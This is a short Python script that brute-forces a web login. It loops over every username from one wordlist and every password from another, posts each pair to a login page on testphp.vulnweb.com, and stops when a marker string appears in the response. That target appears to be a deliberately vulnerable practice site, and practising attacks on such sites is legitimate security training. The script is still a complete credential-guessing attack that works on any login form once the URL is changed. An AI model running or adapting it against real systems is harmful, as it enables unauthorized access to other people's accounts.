import requests
import sys
needle="Johnwick"
with open('username.txt','r') as user:
    for username in user:
            username=username.strip() 
            with open('password.txt','r') as passwords:
                for password in passwords:
                    password=password.strip().encode()
                    sys.stdout.write("Attempting password {}:{}\r".format(username,password.decode()))
                    sys.stdout.flush()
                    res=requests.post('http://testphp.vulnweb.com/userinfo.php',data={'uname':username,'pass':password})
                    if needle in res.text:
                        sys.stdout.write("password found {}".format(password.decode()))
                        sys.stdout.flush()
                        sys.exit()
    sys.stdout.write("no valid password found")
    sys.stdout.flush()
                    